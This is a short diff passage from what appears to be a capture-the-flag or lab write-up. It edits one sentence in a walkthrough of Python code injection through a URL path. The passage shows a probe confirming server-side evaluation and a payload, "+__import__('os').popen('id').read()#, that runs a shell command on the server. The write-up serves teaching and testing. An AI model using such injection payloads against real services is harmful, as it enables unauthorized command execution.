@@ -40,7 +40,7 @@ hello/AAA"+"B"*3#
 > Hello AAABBB
 ```
 
-Go for command execution:
+Yep, code is getting evaluated. Go for command execution:
 
 ```
 /hello/"+__import__('os').popen('id').read()#
